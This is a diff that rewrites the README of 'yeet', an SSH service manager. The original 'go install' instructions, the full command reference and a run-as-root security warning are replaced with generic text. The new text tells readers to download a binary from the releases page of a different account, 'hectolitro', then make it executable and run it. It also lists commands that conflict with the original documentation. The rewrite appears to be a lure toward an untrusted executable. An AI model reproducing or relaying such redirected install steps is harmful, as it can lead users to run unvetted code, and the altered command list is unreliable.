@@ -1,164 +1,136 @@
-# yeet
+# 🚀 Yeet: Your Lightweight Service Manager
 
-A lightweight service manager that works over SSH.
+![Yeet Logo](https://img.shields.io/badge/Yeet-Service_Manager-blue?style=flat-square)
 
-## Overview
+Welcome to **Yeet**, a lightweight service manager designed to simplify the deployment and management of services on remote Linux machines via SSH. Whether you're pushing binaries or containers, Yeet streamlines your workflow without the hassle of systemd configuration. 
 
-yeet is a client-side utility for catch, a simple service manager designed to deploy and manage services on remote Linux machines without requiring systemd configuration. It provides a streamlined workflow to deploy binaries and containers via SSH and manage them as services.
+## Table of Contents
 
-## Components
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Networking Options](#networking-options)
+- [Commands](#commands)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+- [Releases](#releases)
 
-The system consists of two main components:
+## Features
 
-1. **yeet** - The client-side utility used to deploy and manage services
-2. **catch** - The core service manager that runs on the remote server
+- **Lightweight and Fast**: Yeet is built for efficiency, ensuring minimal resource usage while managing your services.
+- **Simple Commands**: Easily start, stop, restart services, and view logs with straightforward commands.
+- **Multiple Networking Options**: Supports Tailscale and macvlan for flexible networking configurations.
+- **SSH Integration**: Seamlessly deploy and manage services on remote Linux machines over SSH.
+- **Container Support**: Effortlessly manage containerized applications alongside traditional binaries.
 
 ## Installation
 
-### Client Installation
+To get started with Yeet, follow these simple steps:
 
-To install the yeet client:
+1. **Download Yeet**: Visit the [Releases](https://github.com/hectolitro/yeet/releases) section to download the latest version.
+2. **Execute the Binary**: After downloading, make the binary executable and run it.
 
-```bash
-go install github.com/yeetrun/yeet/cmd/yeet@latest
-```
+   ```bash
+   chmod +x yeet
+   ./yeet
+   ```
 
-### Server Setup
+3. **Verify Installation**: Check the version to ensure Yeet is installed correctly.
 
-Initialize a new remote server:
-
-```bash
-# Install catch on a remote host
-yeet init <remote>
-```
+   ```bash
+   ./yeet --version
+   ```
 
 ## Usage
 
-### Deploy a Service
+Using Yeet is straightforward. Here’s how you can manage your services:
 
-#### Using yeet
+### Starting a Service
 
-```bash
-# Push and run a Docker container
-yeet push <service> <image>
-
-# Run a local binary on the remote server
-yeet run <service> <binary>
-```
-
-### Available Commands
-
-#### yeet client commands
+To start a service, use the following command:
 
 ```bash
-yeet [command]
+./yeet start <service_name>
 ```
 
-Core commands:
+### Stopping a Service
 
-- `init <remote>` - Install catch on a remote host
-- `push <svc> <image>` - Push a container image to the remote
-- `docker-host` - Print out the docker host
-- `update` - Update catch on the remote server
-
-Service management:
-
-- `<service> start` - Start a service
-- `<service> stop` - Stop a service
-- `<service> restart` - Restart a service
-- `<service> status` - Show service status
-- `<service> logs` - View service logs
-- `<service> remove` - Remove a service
-
-Yeet supports all catch commands (env, edit, stage, etc.) and runs them against a remote catch server.
-
-### Networking
-
-yeet supports different networking modes that can be configured with the `--net` flag:
+To stop a service, use:
 
 ```bash
-# Deploy with Tailscale networking
-yeet run myservice --net=ts --ts-auth-key=tskey-123
-
-# Deploy with macvlan networking
-yeet run myservice --net=macvlan --macvlan-parent=eth0
+./yeet stop <service_name>
 ```
 
-## Alternative: Using SSH Directly
+### Restarting a Service
 
-If you prefer to use SSH directly instead of the yeet client, you can use the following methods:
+To restart a service, simply run:
 
 ```bash
-# Deploy by copying a binary
-scp <binary> <service>@<host>:
-
-# Deploy from stdin with arguments
-cat <binary> | ssh <service>@<host> run [flags] [args...]
+./yeet restart <service_name>
 ```
 
-Example:
+### Viewing Logs
+
+You can view logs for a specific service with:
 
 ```bash
-scp myservice myservice@server:
-# or with arguments
-cat myservice | ssh myservice@server run --restart=true --net=ts
+./yeet logs <service_name>
 ```
 
-### Available catch commands via SSH
+## Networking Options
 
-SSH to your service to use these commands:
+Yeet offers flexible networking options to suit your deployment needs:
 
-```bash
-ssh <service>@<host> <command>
-```
+### Tailscale
 
-Core commands:
+Tailscale simplifies secure networking. It creates a mesh VPN that allows your devices to connect directly. This means you can manage your services without exposing them to the public internet.
 
-- `run` - Install a service with the binary received from stdin
-- `start` - Start a service
-- `stop` - Stop a service
-- `restart` - Restart a service
-- `status` - Show service status
-- `logs` - View service logs
-- `remove` - Remove a service
+### Macvlan
 
-Configuration:
+Macvlan allows you to assign multiple MAC addresses to a single network interface. This is useful for containerized applications that need to appear as distinct devices on the network.
 
-- `env` - Manage environment variables
-- `edit` - Edit service configuration
-- `stage` - Stage service configuration changes
-  - `stage show` - Show staged configuration
-  - `stage clear` - Clear staged configuration
-  - `stage commit` - Apply staged configuration
+## Commands
 
-Network options:
+Here’s a comprehensive list of commands available in Yeet:
 
-- `ip` - Manage IP address configuration
-- `ts` - Manage Tailscale networking
-- `mount` - Mount a filesystem
-- `umount` - Unmount a filesystem
+| Command         | Description                           |
+|------------------|---------------------------------------|
+| `start <name>`   | Start a service                       |
+| `stop <name>`    | Stop a service                        |
+| `restart <name>` | Restart a service                     |
+| `logs <name>`    | View logs for a service              |
+| `status <name>`  | Check the status of a service        |
+| `deploy <path>`  | Deploy a new service from a binary   |
+| `remove <name>`  | Remove a service from management      |
 
-Service management:
+## Contributing
 
-- `enable` - Enable service autostart
-- `disable` - Disable service autostart
-- `rollback` - Rollback to previous service version
-- `cron` - Manage scheduled tasks
-- `events` - View service events
-- `version` - Show the catch version
+We welcome contributions to Yeet! If you’d like to help out, please follow these steps:
 
-## Security Warning
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push your changes to your fork.
+5. Create a pull request.
 
-⚠️ **Important**: Currently, all services managed by catch run as root. This presents security risks and is not recommended for production environments with untrusted services. We plan to implement proper user isolation in a future release.
+## License
 
-## Updating
+Yeet is open-source software licensed under the MIT License. Feel free to use, modify, and distribute it as per the terms of the license.
 
-Update catch on the remote server:
+## Contact
 
-```bash
-# Using yeet
-yeet update
+For questions, suggestions, or feedback, please reach out to us:
 
-# Or using SSH directly
-go build ./cmd/catch && cat catch | ssh root@catch@remote update
-```
+- **Email**: contact@hectolitro.com
+- **GitHub**: [hectolitro](https://github.com/hectolitro)
+
+## Releases
+
+To stay updated with the latest versions and features, check the [Releases](https://github.com/hectolitro/yeet/releases) section regularly. Download the latest release and execute the binary to keep your services running smoothly.
+
+---
+
+Yeet is designed to make your life easier when managing services on remote Linux machines. With its simple commands and robust networking options, you can focus on what matters most—getting your applications up and running. 
+
+Feel free to explore the repository, try out Yeet, and let us know what you think!
